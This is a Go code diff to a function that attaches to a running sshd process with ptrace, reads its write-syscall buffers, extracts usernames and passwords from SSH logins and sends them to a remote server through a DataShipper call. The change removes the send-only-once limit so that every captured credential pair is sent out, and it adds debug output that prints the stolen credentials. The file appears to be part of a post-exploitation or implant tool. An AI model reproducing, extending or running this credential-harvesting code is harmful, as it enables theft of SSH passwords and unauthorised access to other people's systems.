@@ -14,6 +14,7 @@ import (
 	"syscall"
 )
 
+
 func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string]interface{}, pid int) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
@@ -28,8 +29,7 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 	}
 	var wstatus syscall.WaitStatus
 	var inSyscall bool
-	var firstValidCapture string
-	shipped := false
+	//shipped := false
 
 	for {
 		if ctx.Err() != nil {
@@ -38,6 +38,9 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 
 		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
+			if debug.Debug {
+				fmt.Printf("[*] Wait4 error: %v\n", err)
+			}
 			return
 		}
 		if ctx.Err() != nil {
@@ -53,11 +56,15 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 
 			var regs syscall.PtraceRegs
 			if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
+				if debug.Debug {
+					fmt.Printf("[*] PtraceGetRegs error: %v\n", err)
+				}
 				return
 			}
 
 			// Only process write syscalls on entry, where the userspace buffer is valid
-			if regs.Orig_rax == 1 && inSyscall && !shipped {
+			//if regs.Orig_rax == 1 && inSyscall && !shipped {
+			if regs.Orig_rax == 1 && inSyscall {
 				fd := int(regs.Rdi)
 				if fd >= 0 && fd <= 20 {
 					bufferSize := int(regs.Rdx)
@@ -66,6 +73,9 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 						if _, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer); err != nil {
 							syscall.PtraceSyscall(pid, 0)
 							continue
+						}
+						if debug.Debug {
+							fmt.Printf("[*] Captured write syscall to fd %v with buffer:\n%s\n", fd, string(buffer))
 						}
 
 						var password string
@@ -81,9 +91,11 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 						} else {
 							password = string(buffer)
 						}
-
 						password = RemoveNonPrintableAscii(password)
+
 						if IsValidPassword(password) {
+							//var firstValidCapture string
+							/*
 							if firstValidCapture == "" {
 								// First valid capture during SSH auth is the username,
 								// not the password. Store it and wait for the real password.
@@ -99,6 +111,13 @@ func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string
 								go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
 								shipped = true
 							}
+							*/
+							username := extractSSHUsername(pid)
+							if debug.Debug {
+								fmt.Printf("[!] Detected credentials from ssh: %v:%v\n", username, password)
+							}
+							go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
+							//shipped = true
 						}
 					}
 				}
